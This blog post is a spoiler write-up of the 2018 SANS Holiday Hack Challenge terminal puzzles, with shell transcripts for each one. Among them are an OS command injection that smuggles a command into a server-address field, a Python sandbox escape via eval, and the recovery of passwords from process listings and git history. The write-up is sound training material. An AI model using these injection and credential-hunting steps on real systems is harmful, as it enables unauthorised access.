---
layout: post
title: 2018 SANS Holiday Hack Challenge Writeup
draft: false
---

This year's [SANS Holiday Hack Challenge](https://www.holidayhackchallenge.com/2018/) (KringleCon) was again very enjoyable. There was a lot of new stuff to learn and practice. It's very impressive that the SANS team would spend so much time and effort every year to build this great free learning event for us. Thanks guys!

**This is a full writeup of the challenge, and naturally it contains spoilers - if you want to solve it on your own read no further.**

![]({{ site.baseurl }}/images/sans2018/kringlecon.png)

## Getting started

KringleCon is set up as a virtual security conference. It has a number of elements:

- Security presentations (that you really should study closely as they contain a number of hints)
- Terminal challenges
- Security challenges

![]({{ site.baseurl }}/images/sans2018/entrance.png)

When we start we build our virtual character's appearance. It has a conference "badge", and when you click on it you can track your progress and see hints and achievements.

When we log into the KringleCon we can walk through Santa's castle, solving challenges along the way. The objective is to solve everything and find answers to 14 questions posed by organizers (see the end of this writeup for answers).

Throughout the castle a number of NPCs are stationed that you can talk to. Make sure that you talk to every character _before_ and _after_ you solve each particular challenge, because in those conversations valuable hints will be revealed. Record all the information that you come across as it will prove valuable later.

## Terminal challenges

#### Essential Editor Skills

The first challenge is trivial - we are dropped into a ```vi``` instance and are asked to exit it. The simple character sequence ``` :q ``` gets us out, and the achievement is unlocked:

```
Loading, please wait......

You did it! Congratulations!

elf@c12ee7a98c50:~$
```

#### The Name Game

In this challenge we need to use SQlite to determine the worker's first name:

```
To solve this challenge, determine the new worker's first name and submit to runtoanswer.

====================================================================
=                                                                  =
= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =
=                                                                  =
====================================================================

 Press  1 to start the onboard process.
 Press  2 to verify the system.
 Press  q to quit.

Please make a selection: 
```

When we select second option we are asked for a server name that is then passed to ```ping```:

```
Validating data store for employee onboard information.
Enter address of server: localhost
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.040 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.051 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.047 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2038ms
rtt min/avg/max/mdev = 0.040/0.046/0.051/0.004 ms
onboard.db: SQLite 3.x database
Press Enter to continue...:  
```

This looks vulnerable to OS command injection, and indeed it is. We can open ```sqlite3``` and figure out the name of the employee:

```
Validating data store for employee onboard information.
Enter address of server: localhost ; sqlite3
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.034 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.051 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.040 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2046ms
rtt min/avg/max/mdev = 0.034/0.041/0.051/0.010 ms
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open onboard.db
sqlite> .tables
onboard
sqlite> select * from onboard where lname="Chan";
84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com
sqlite> 
```

The name is ```Scott``` - we can now submit it as a solution:

```
sqlite> .system ls
menu.ps1  onboard.db  runtoanswer
sqlite> .system runtoanswer

Enter Mr. Chan's first name: Scott

                                                                                
    .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:'    
  'ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO000Okdooooooooooooo;  
 'oooooooooooooXMWooooOMMxodMMNKKKKxoOMMxoooooWMXoooookNMWK0KNMWOooooooooooooo; 
 :oooooooooooooXMWooooOMMxodMM0ooooooOMMxoooooWMXooooxMMKoooooKMMkooooooooooooo 
 coooooooooooooXMMMMMMMMMxodMMWWWW0ooOMMxoooooWMXooooOMMkoooookMM0ooooooooooooo 
 coooooooooooooXMWdddd0MMxodMM0ddddooOMMxoooooWMXooooOMMOoooooOMMkooooooooooooo 
 coooooooooooooXMWooooOMMxodMMKxxxxdoOMMOkkkxoWMXkkkkdXMW0xxk0MMKoooooooooooooo 
 cooooooooooooo0NXooookNNdodXNNNNNNkokNNNNNNOoKNNNNNXookKNNWNXKxooooooooooooooo 
 cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo 
 cooooooooooooooooooooooooooooooooooMYcNAMEcISooooooooooooooooooooooooooooooooo
 cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo 
 OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW 
 OMMMMMMMMMMMMW:  .. ;MMMk'     .NMX:.  .  .lWO         d         xMMMMMMMMMMMW 
 OMMMMMMMMMMMMo  OMMWXMMl  lNMMNxWK  ,XMMMO  .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMX.  .cOWMN  'MMMMMMM;  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMMMKo,   KN  ,MMMMMMM,  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMKNMMMO  oM,  dWMMWOWk  cWMMMO  ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMc ...  cWMWl.  .. .NMk.  ..  .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK 
 .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo, 
  .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,  
    .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;.    
                                                                                

Congratulations!
```

### Stall Mucking Report

Based on the hints we received we can suspect that the password needed to submit the report is passed on the command line somewhere. So let's list processes with the "wide" option:

```
Complete this challenge by uploading the elf's report.txt
file to the samba share at //localhost/report-upload/
elf@c32b0885d734:~$ ps -ewwF
UID        PID  PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
root         1     0  0  4488  2864   1 22:34 pts/0    00:00:00 /bin/bash /sbin/init
root        10     1  0 11330  3088   4 22:34 pts/0    00:00:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
root        11     1  0 11330  3224   4 22:34 pts/0    00:00:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py
root        15     1  0 11330  3176   4 22:34 pts/0    00:00:00 sudo -u elf /bin/bash
manager     16    11  0  8462  8108   7 22:34 pts/0    00:00:00 /usr/bin/python /home/manager/report-check.py
manager     17    10  0  2375  2624   0 22:34 pts/0    00:00:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
elf         19    15  0  4569  3348   7 22:34 pts/0    00:00:00 /bin/bash
root        23     1  0 79166 15916   0 22:34 ?        00:00:00 /usr/sbin/smbd
root        24    23  0 77093  5856   7 22:34 ?        00:00:00 /usr/sbin/smbd
root        25    23  0 77091  4512   6 22:34 ?        00:00:00 /usr/sbin/smbd
root        27    23  0 79166  6024   1 22:34 ?        00:00:00 /usr/sbin/smbd
manager     49    17  0  1049   680   6 22:46 pts/0    00:00:00 sleep 60
elf         56    19  0  9159  2804   0 22:47 pts/0    00:00:00 ps -ewwF
```

Note that one of the processes has an interesting parameter that is likely a password: ```directreindeerflatterystable```

Now that we have it we can use it to submit the report:

```
elf@c32b0885d734:~$ smbclient -U report-upload //localhost/report-upload
WARNING: The "syslog" option is deprecated
Enter report-upload's password: 
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
smb: \> put report.txt
putting file report.txt as \report.txt (500.9 kb/s) (average 501.0 kb/s)
smb: \> Terminated

elf@c32b0885d734:~$ 
                                                                               
                               .;;;;;;;;;;;;;;;'                               
                             ,NWOkkkkkkkkkkkkkkNN;                             
                           ..KM; Stall Mucking ,MN..                           
                         OMNXNMd.             .oMWXXM0.                        
                        ;MO   l0NNNNNNNNNNNNNNN0o   xMc                        
                        :MO                         xMl             '.         
                        :MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.       
 .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.     
 'kkkkxxxxxddddddoooooooxMO   ..'''''''''''.        xMkcccccccllllllllllooc.   
 'kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool  
 'kkkkxxxxxddddddoooooooxMO   '::::::::::::,        xMkcccccccllllllllllool,   
 .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll'     
                        :MO  .ONNNNNNNNXk           xMl             :lc'       
                        :MO   dOOOOOOOOOo           xMl             ;.         
                        :MO   'cccccccccccccc:'     xMl                        
                        :MO  .WMMMMMMMMMMMMMMMW.    xMl                        
                        :MO    ...............      xMl                        
                        .NWxddddddddddddddddddddddddNW'                        
                          ;ccccccccccccccccccccccccc;                          
                                                                               



You have found the credentials I just had forgot,
And in doing so you've saved me trouble untold.
Going forward we'll leave behind policies old,
Building separate accounts for each elf in the lot.

-Wunorse Openslae
```

#### CURLing Master

From the hints we know that we need to use HTTP2 to talk to this server. Let's use ```curl```:

```
  Complete this challenge by submitting the right HTTP 
  request to the server at http://localhost:8080/ to 
  get the candy striper started again. You may view 
  the contents of the nginx.conf file in 
  /etc/nginx/, if helpful.
elf@eb675802f32a:~$ curl --http2-prior-knowledge http://localhost:8080/
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"
 </body>
</html>
```

So ```status``` is a required parameter, let's use it:

```
elf@eb675802f32a:~$ curl --http2-prior-knowledge -d "status=on" -X POST http://localhost:8080/
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"

                                                                                
                                                                okkd,          
                                                               OXXXXX,         
                                                              oXXXXXXo         
                                                             ;XXXXXXX;         
                                                            ;KXXXXXXx          
                                                           oXXXXXXXO           
                                                        .lKXXXXXXX0.           
  ''''''       .''''''       .''''''       .:::;   ':okKXXXXXXXX0Oxcooddool,   
 'MMMMMO',,,,,;WMMMMM0',,,,,;WMMMMMK',,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX.  
 'MMMMN;,,,,,'0MMMMMW;,,,,,'OMMMMMW:,,,,,'kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d;   
 'MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x. 
 'MMMO',,,,,;WMMMMMO',,,,,,NMMMMMK',,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX: 
 'MMN,,,,,,'OMMMMMW;,,,,,'kMMMMMW;,,,,,'xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;.  
 'MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO.  
 'M0',,,,,;WMMMMM0',,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk.  
 .c.......'cccccc.......'cccccc.......'cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc     
                                                    ;xKXXXXXXX0xKXXXXXXXXK.    
                                                       ..,:ccllc:cccccc:'      
Unencrypted 2.0? He's such a silly guy.
That's the kind of stunt that makes my OWASP friends all cry.
Truth be told: most major sites are speaking 2.0;
TLS connections are in place when they do so.

-Holly Evergreen
<p>Congratulations! You've won and have successfully completed this challenge.
<p>POSTing data in HTTP/2.0.

 </body>
</html>
```

#### Python Escape from LA

Just as the name suggests we need to escape Python interpreter. The Python presentation will come really handy for solving this one:

```
To complete this challenge, escape Python
and run ./i_escaped
>>> import
Use of the command import is prohibited for this question.
>>> eval
<built-in function eval>
>>> exec
Use of the command exec is prohibited for this question.
>>> compile
Use of the command compile is prohibited for this question.
>>> s=eval("__im"+"port__('os')")
>>> s.system("ls")
i_escaped
0
>>> s.system("./i_escaped")
Loading, please wait......


 
  ____        _   _                      
 |  _ \ _   _| |_| |__   ___  _ __       
 | |_) | | | | __| '_ \ / _ \| '_ \      
 |  __/| |_| | |_| | | | (_) | | | |     
 |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ 
 | ____||___/___ __ _ _ __   ___  __| | |
 |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |
 | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
 |_____|___/\___\__,_| .__/ \___|\__,_(_)
                     |_|                             


That's some fancy Python hacking -
You have sent that lizard packing!

-SugarPlum Mary
            
You escaped! Congratulations!
```

#### Dev Ops Fail

In this challenge we need to find a password. As we can see there is a Git repository here:
```
Find Sparkle's password, then run the runtoanswer tool.
elf@2a20a2a0ef0d:~$ ls -la
total 5832
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:30 .
drwxr-xr-x 1 root root    4096 Dec 14 16:30 ..
-rw-r--r-- 1 elf  elf      220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf     1836 Dec 14 16:13 .bashrc
-rw-r--r-- 1 elf  elf      675 May 15  2017 .profile
drwxr-xr-x 1 elf  elf     4096 Nov 14 09:48 kcconfmgmt
-rwxr-xr-x 1 elf  elf  5944352 Dec 14 16:13 runtoanswer
elf@2a20a2a0ef0d:~$ ls -la kcconfmgmt/
total 72
drwxr-xr-x 1 elf elf  4096 Nov 14 09:48 .
drwxr-xr-x 1 elf elf  4096 Dec 14 16:30 ..
drwxr-xr-x 1 elf elf  4096 Nov 14 09:48 .git
-rw-r--r-- 1 elf elf    66 Nov  1 15:30 README.md
-rw-r--r-- 1 elf elf  1074 Nov  3 20:28 app.js
-rw-r--r-- 1 elf elf 31003 Nov 14 09:46 package-lock.json
-rw-r--r-- 1 elf elf   537 Nov 14 09:48 package.json
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 public
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 routes
drwxr-xr-x 1 elf elf  4096 Nov 14 09:47 server
drwxr-xr-x 1 elf elf  4096 Nov  2 15:05 views
```

Because a simple file search finds nothing let's search the Git history:

```
elf@2a20a2a0ef0d:~$ cd kcconfmgmt
elf@2a20a2a0ef0d:~/kcconfmgmt$ git log -p -- server/config/config.js
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings
 in config.js.def need to be updated before use

...

diff --git a/server/config/config.js b/server/config/config.js
deleted file mode 100644
index 25be269..0000000
--- a/server/config/config.js
+++ /dev/null
@@ -1,4 +0,0 @@
-// Database URL
-module.exports = {
-    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
-};
```

To complete the challenge let's submit the password:

```
elf@2a20a2a0ef0d:~$ ./runtoanswer 
Loading, please wait......



Enter Sparkle Redberry's password: twinkletwinkletwinkle


This ain't "I told you so" time, but it's true:
I shake my head at the goofs we go through.
Everyone knows that the gits aren't the place;
Store your credentials in some safer space.

Congratulations!
```

#### The Sleighbell Lottery

This time around we need to exploit the lottery process:

```
Complete this challenge by winning the sleighbell lottery for Shinny Upatree.
elf@eee6608f8c95:~$ ls -la
total 60
drwxr-xr-x 1 elf  elf   4096 Dec 14 16:22 .
drwxr-xr-x 1 root root  4096 Dec 14 16:21 ..
-rw-r--r-- 1 elf  elf    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elf  elf   3785 Dec 14 16:21 .bashrc
-rw-r--r-- 1 elf  elf    807 Apr  4  2018 .profile
lrwxrwxrwx 1 elf  elf     12 Dec 14 16:21 gdb -> /usr/bin/gdb
lrwxrwxrwx 1 elf  elf     16 Dec 14 16:21 objdump -> /usr/bin/objdump
-rwxr-xr-x 1 root root 38144 Dec 14 16:22 sleighbell-lotto
elf@eee6608f8c95:~$ ./sleighbell-lotto 

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 9834!

Sorry - better luck next year!
```

Hints point to using GDB to achieve this, so let's analyze the executable:

```
elf@eee6608f8c95:~$ gdb sleighbell-lotto 
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from sleighbell-lotto...(no debugging symbols found)...done.
(gdb) start
Temporary breakpoint 1 at 0x14ce
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Temporary breakpoint 1, 0x00005555555554ce in main ()
(gdb) disass
Dump of assembler code for function main:
   0x00005555555554ca <+0>:     push   %rbp
   0x00005555555554cb <+1>:     mov    %rsp,%rbp
=> 0x00005555555554ce <+4>:     sub    $0x10,%rsp
   0x00005555555554d2 <+8>:     lea    0x56d6(%rip),%rdi        # 0x55555555abaf
   0x00005555555554d9 <+15>:    callq  0x555555554970 <getenv@plt>
   0x00005555555554de <+20>:    test   %rax,%rax
   0x00005555555554e1 <+23>:    jne    0x5555555554f9 <main+47>
   0x00005555555554e3 <+25>:    lea    0x56d6(%rip),%rdi        # 0x55555555abc0
   0x00005555555554ea <+32>:    callq  0x555555554910 <puts@plt>
   0x00005555555554ef <+37>:    mov    $0xffffffff,%edi
   0x00005555555554f4 <+42>:    callq  0x555555554920 <exit@plt>
   0x00005555555554f9 <+47>:    mov    $0x0,%edi
   0x00005555555554fe <+52>:    callq  0x5555555549e0 <time@plt>
   0x0000555555555503 <+57>:    mov    %eax,%edi
   0x0000555555555505 <+59>:    callq  0x5555555549a0 <srand@plt>
   0x000055555555550a <+64>:    lea    0x583f(%rip),%rdi        # 0x55555555ad50
   0x0000555555555511 <+71>:    callq  0x555555554910 <puts@plt>
   0x0000555555555516 <+76>:    mov    $0x1,%edi
   0x000055555555551b <+81>:    callq  0x555555554960 <sleep@plt>
   0x0000555555555520 <+86>:    callq  0x5555555549c0 <rand@plt>
   0x0000555555555525 <+91>:    mov    %eax,%ecx
   0x0000555555555527 <+93>:    mov    $0x68db8bad,%edx
   0x000055555555552c <+98>:    mov    %ecx,%eax
   0x000055555555552e <+100>:   imul   %edx
   0x0000555555555530 <+102>:   sar    $0xc,%edx
   0x0000555555555533 <+105>:   mov    %ecx,%eax
   0x0000555555555535 <+107>:   sar    $0x1f,%eax
   0x0000555555555538 <+110>:   sub    %eax,%edx
   0x000055555555553a <+112>:   mov    %edx,%eax
   0x000055555555553c <+114>:   mov    %eax,-0x4(%rbp)
   0x000055555555553f <+117>:   mov    -0x4(%rbp),%eax
   0x0000555555555542 <+120>:   imul   $0x2710,%eax,%eax
---Type <return> to continue, or q <return> to quit---
   0x0000555555555548 <+126>:   sub    %eax,%ecx
   0x000055555555554a <+128>:   mov    %ecx,%eax
   0x000055555555554c <+130>:   mov    %eax,-0x4(%rbp)
   0x000055555555554f <+133>:   lea    0x5856(%rip),%rdi        # 0x55555555adac
   0x0000555555555556 <+140>:   mov    $0x0,%eax
   0x000055555555555b <+145>:   callq  0x5555555548f0 <printf@plt>
   0x0000555555555560 <+150>:   mov    -0x4(%rbp),%eax
   0x0000555555555563 <+153>:   mov    %eax,%esi
   0x0000555555555565 <+155>:   lea    0x5858(%rip),%rdi        # 0x55555555adc4
   0x000055555555556c <+162>:   mov    $0x0,%eax
   0x0000555555555571 <+167>:   callq  0x5555555548f0 <printf@plt>
   0x0000555555555576 <+172>:   lea    0x584a(%rip),%rdi        # 0x55555555adc7
   0x000055555555557d <+179>:   callq  0x555555554910 <puts@plt>
   0x0000555555555582 <+184>:   cmpl   $0x4c9,-0x4(%rbp)
   0x0000555555555589 <+191>:   jne    0x555555555597 <main+205>
   0x000055555555558b <+193>:   mov    $0x0,%eax
   0x0000555555555590 <+198>:   callq  0x555555554fd7 <winnerwinner>
   0x0000555555555595 <+203>:   jmp    0x5555555555a1 <main+215>
   0x0000555555555597 <+205>:   mov    $0x0,%eax
   0x000055555555559c <+210>:   callq  0x5555555554b7 <sorry>
   0x00005555555555a1 <+215>:   mov    $0x0,%edi
   0x00005555555555a6 <+220>:   callq  0x555555554920 <exit@plt>
End of assembler dump.
(gdb) stepi
0x00005555555554d2 in main ()
```

It looks like to become a winner we need to be at address ```0x000055555555558b```. Let's simply jump to it:

```
(gdb) jump *0x000055555555558b                   
Continuing at 0x55555555558b.

                                                                                
                                                     .....          ......      
                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
     ...................,',,:lxkkkkkkkkkkkkkd.                                  
     ..........................';;:coxkkkkk:                                    
        ...............................ckd.                                     
          ...............................                                       
                ...........................                                     
                   .......................                                      
                              ....... ...                                       

With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.
```

#### Lethal ForensicELFication

As the name suggests this is a forensic challenge. Let's look around:

```
  Find the first name of the elf of whom a love poem 
  was written.  Complete this challenge by submitting 
  that name to runtoanswer.
elf@66566975724a:~$ ls -la
total 5460
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .
drwxr-xr-x 1 root root    4096 Dec 14 16:28 ..
-rw-r--r-- 1 elf  elf      419 Dec 14 16:13 .bash_history
-rw-r--r-- 1 elf  elf      220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf     3540 Dec 14 16:28 .bashrc
-rw-r--r-- 1 elf  elf      675 May 15  2017 .profile
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .secrets
-rw-r--r-- 1 elf  elf     5063 Dec 14 16:13 .viminfo
-rwxr-xr-x 1 elf  elf  5551072 Dec 14 16:13 runtoanswer
```

When we look inside the ```.viminfo``` file we can clearly see the name:

```
elf@66566975724a:~$ cat .viminfo 
...
# Command Line History (newest to oldest):
:wq
|2,0,1536607231,,"wq"
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,"%s/Elinore/NEVERMORE/g"
:r .secrets/her/poem.txt
|2,0,1536607201,,"r .secrets/her/poem.txt"
:q
...
```

We can now submit the answer:

```
elf@66566975724a:~$ ./runtoanswer 
Loading, please wait......


Who was the poem written about? Elinore


WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXKK00OOOxddddollcccll:;,;:;,'...,,.....'',,''.    .......    .''''''       
WWNXXXKK0OOkxdxxxollcccoo:;,ccc:;...:;...,:;'...,:;.  ,,....,,.  ::'....       
WWNXXXKK0OOkxdxxxollcccoo:;,cc;::;..:;..,::...   ;:,  ,,.  .,,.  ::'...        
WWNXXXKK0OOkxdxxxollcccoo:;,cc,';:;':;..,::...   ,:;  ,,,',,'    ::,'''.       
WWNXXXK0OOkkxdxxxollcccoo:;,cc,'';:;:;..'::'..  .;:.  ,,.  ','   ::.           
WWNXXXKK00OOkdxxxddooccoo:;,cc,''.,::;....;:;,,;:,.   ,,.   ','  ::;;;;;       
WWNXXKK0OOkkxdddoollcc:::;;,,,'''...............                               
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 

Thank you for solving this mystery, Slick.
Reading the .viminfo sure did the trick.
Leave it to me; I will handle the rest.
Thank you for giving this challenge your best.

-Tangle Coalbox
-ER Investigator

Congratulations!

elf@66566975724a:~$ 
```

#### Yule Log Analysis

We need to study the log file and figure out which user name was compromized. A provided tool can be used to extract log entries in plaintext:

```
  Submit the compromised webmail username to 
  runtoanswer to complete this challenge.
elf@ad955a49d6ef:~$ python evtx_dump.py ho-ho-no.evtx > /tmp/a
```

After looking through the multitude of events we can do some filtering to find the one we are looking for. Since we are searching for successful logins, event [ID 4624](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624) is the one we will filter on:

```
elf@ad955a49d6ef:~$ grep -A 20 4624 /tmp/a | grep -i targetusername | sort | uniq
<Data Name="TargetUserName">ANONYMOUS LOGON</Data>
<Data Name="TargetUserName">Administrator</Data>
<Data Name="TargetUserName">DWM-1</Data>
<Data Name="TargetUserName">HealthMailboxbab78a6</Data>
<Data Name="TargetUserName">HealthMailboxbe58608</Data>
<Data Name="TargetUserName">IUSR</Data>
<Data Name="TargetUserName">LOCAL SERVICE</Data>
<Data Name="TargetUserName">MSSQL$MICROSOFT##WID</Data>
<Data Name="TargetUserName">NETWORK SERVICE</Data>
<Data Name="TargetUserName">SYSTEM</Data>
<Data Name="TargetUserName">bushy.evergreen</Data>
<Data Name="TargetUserName">minty.candycane</Data>
<Data Name="TargetUserName">shinny.upatree</Data>
<Data Name="TargetUserName">sparkle.redberry</Data>
<Data Name="TargetUserName">wunorse.openslae</Data>
```

This gave us a few usernames, and we can simply try each one to see which matches. Deeper analysis can be done to narrow down the right account with more certainty but the bruteforce solution is the most time-saving one:

```
elf@ad955a49d6ef:~$ runtoanswer
Loading, please wait......

Whose account was successfully accessed by the attacker's password spray? minty.candycane

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMXO0NMxl0MXOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMxlllooldollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMW0OKWMMNKkollldOKWMMNKOKMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXollox0NMMMxlOMMMXOdllldWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMWXOdlllokKxlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMNkkXMMMMMMMMMMMWKkollllllldkKWMMMMMMMMMMM0kOWMMMMMMMMMMMM
MMMMMMWKXMMMkllxMMMMMMMMMMMMMMMXOold0NMMMMMMMMMMMMMMMollKMMWKKWMMMMMM
MMMMMMdllKMMkllxMMMMMMMMMMMMN0KNMxl0MN00WMMMMMMMMMMMMollKMMOllkMMMMMM
Mkox0XollKMMkllxMMMMMMMMMMMMxllldoldolllOMMMMMMMMMMMMollKMMkllxXOdl0M
MMN0dllll0MMkllxMMMMMMMMMMMMMN0xolllokKWMMMMMMMMMMMMMollKMMkllllx0NMM
MW0xolllolxOxllxMMNxdOMMMMMWMMMMWxlOMMMMWWMMMMWkdkWMMollOOdlolllokKMM
M0lldkKWMNklllldNMKlloMMMNolok0NMxl0MX0xolxMMMXlllNMXolllo0NMNKkoloXM
MMWWMMWXOdlllokdldxlloWMMXllllllooloollllllWMMXlllxolxxolllx0NMMMNWMM
MMMN0kolllx0NMMW0ollll0NMKlloN0kolllokKKlllWMXklllldKMMWXOdlllokKWMMM
MMOllldOKWMMMMkollox0OdldxlloMMMMxlOMMMNlllxoox0Oxlllo0MMMMWKkolllKMM
MMW0KNMMMMMMMMKkOXWMMMW0olllo0NMMxl0MWXklllldXMMMMWKkkXMMMMMMMMX0KWMM
